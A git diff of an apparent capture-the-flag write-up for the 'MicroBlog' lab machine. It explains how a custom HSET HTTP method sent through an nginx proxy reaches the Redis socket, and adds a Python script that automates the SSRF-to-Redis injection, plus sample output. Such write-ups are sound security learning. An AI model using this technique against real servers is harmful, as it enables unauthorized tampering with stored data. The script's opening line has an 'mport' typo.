@@ -417,16 +417,20 @@ http://microblog.htb/static/unix:/var/run/redis/redis.sock:asdf%20pro%20true%20/
 http://asdf.microbucket.htb/unix:/var/run/redis/redis.sock:asdf%20pro%20true%20
 ```
 
-Which would correspond to this request
+So if we change the HTTP method to the relevant redis command:
 ```
-GET unix:/var/run/redis/redis.sock asdf pro true
+HSET /static/unix:/var/run/redis/redis.sock:asdf%20pro%20true%20/asdf HTTP/1.1
+Host: microblog.htb
+
+
 ```
 
-So if we change the HTTP method to the relevant redis command, (and it is interesting to note that apparently curl will let you do that) this should work
-```
-HSET unix:/var/run/redis/redis.sock asdf pro true
+it would correspond to this in redis-cli:
+```bash
+redis-cli -s unix:/var/run/redis/redis.sock HSET asdf pro true
 ```
 
+And it is interesting to note that apparently curl will let you do that
 Let's try it out
 ```bash
 curl -XHSET http://microblog.htb/static/unix:/var/run/redis/redis.sock:asdf%20pro%20true%20/asdf
@@ -442,4 +446,83 @@ curl -XHSET http://microblog.htb/static/unix:/var/run/redis/redis.sock:asdf%20pr
 Nice!  
 ![pro.png](pro.png)  
 
+## Automating the exploit
 
+The users are getting wiped quite frequently, and automating that looked like a fun exercise. Also because python requests wouldn't let us do the cool trick did with curl, using an invalid HTTP method... I had to do it in raw bytes in a TCP socket. I think it helped me a lot in getting a better understanding of how the proxy exploit works since we're working directly with what the actual bytes look like in the HTTP request. 
+```python
+mport requests
+import json
+import socket
+from simple_chalk import green
+import sys
+
+
+PROXY = 'http://127.0.0.1:8080'
+DOMAIN = 'microblog.htb'
+HEADERS = { 'Content-Type': 'application/x-www-form-urlencoded' }
+USER = sys.argv[1]
+
+
+def login():
+    data = f'username={USER}&password={USER}'
+    url = f'http://app.{DOMAIN}/login/index.php'
+    res = requests.post(url, data, headers=HEADERS, proxies={'http': PROXY})
+    cookie = res.history[0].cookies.get_dict()
+    return cookie
+
+
+def register():
+    data = f'first-name={USER}&last-name={USER}&username={USER}&password={USER}'
+    url = f'http://app.{DOMAIN}/register/index.php'
+    res = requests.post(url, data, headers=HEADERS, proxies={'http': PROXY})
+    if 'successful' in res.url:
+        print(f'{green("[+]")} User successfully registered')
+        cookie = res.history[0].cookies.get_dict()
+    if 'already' in res.url:
+        print(f'{green("[+]")} User already exists')
+        cookie = login()
+    #print(f'{green("[+]")} {cookie}')
+    return cookie
+
+
+def create_blog(cookies):
+    data = f'new-blog-name={USER}'
+    url = f'http://app.{DOMAIN}/dashboard/index.php'
+    res = requests.post(url, data, headers=HEADERS, cookies=cookies, proxies={'http': PROXY})
+    if 'already' in res.url:
+        print(f'{green("[+]")} Blog already exists')
+    if 'successful' in res.url:
+        print(f'{green("[+]")} Blog successfully created')
+
+
+def brush_like_a_pro():
+    """Get an oral-B toothbrush from Redis"""
+    uds = 'unix:/var/run/redis/redis.sock'
+    payload = f'HSET /static/{uds}:{USER}%20pro%20true%20/{USER} HTTP/1.1\r\n'\
+              f'Host: {DOMAIN}'\
+              '\r\n'\
+              '\r\n'.encode()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((DOMAIN, 80))
+    sock.send(payload)
+    res = sock.recv(4096)
+    sock.close()
+    if '502 Bad Gateway' in res.decode():
+        print(f'{green("[+]")} You can now brush like a pro 🪥')
+
+if __name__ == "__main__":
+    cookies = register()
+    create_blog(cookies)
+    brush_like_a_pro()
+```
+
+```bash
+python3 micro.py blnkn
+[+] User successfully registered
+[+] Blog successfully created
+[+] You can now brush like a pro 🪥
+```
+
+![ham.png](ham.png)  
+
+yea boy...I'm a pro
